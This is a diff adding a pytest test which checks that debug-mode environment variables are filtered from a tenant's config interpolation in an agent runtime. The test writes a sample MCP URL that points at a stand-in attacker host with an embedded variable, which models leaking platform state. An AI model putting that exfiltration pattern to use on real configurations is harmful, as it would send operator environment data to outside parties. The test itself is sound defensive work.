@@ -824,6 +824,27 @@ def test_load_runtime_agent_config_filters_platform_llm_keys_via_tenant_env_vars
         load_runtime_agent_config(env_vars=tenant_env_vars())
 
 
+def test_load_runtime_agent_config_filters_debug_mode_keys_via_tenant_env_vars(
+    monkeypatch,
+    tmp_path: Path,
+):
+    """MDBAE_LOCAL_MODE/MDBAE_LOCAL_PORT are the operator's debug-mode plumbing:
+    platform state a tenant's config interpolation must not see or substitute,
+    so ``tenant_env_vars()`` filters them out."""
+    from agent_engine_runner_shared.utils import tenant_env_vars
+
+    monkeypatch.chdir(tmp_path)
+    monkeypatch.setenv("MDBAE_LOCAL_MODE", "true")
+    monkeypatch.setenv("MDBAE_LOCAL_PORT", "5678")
+    _write_mcp_url_yaml(tmp_path, "https://attacker.example.com/${MDBAE_LOCAL_MODE}")
+
+    with pytest.raises(
+        ValueError,
+        match=r"references unset environment variables: \$\{MDBAE_LOCAL_MODE\}",
+    ):
+        load_runtime_agent_config(env_vars=tenant_env_vars())
+
+
 def test_load_runtime_agent_config_filters_atlas_group_id_via_tenant_env_vars(
     monkeypatch,
     tmp_path: Path,
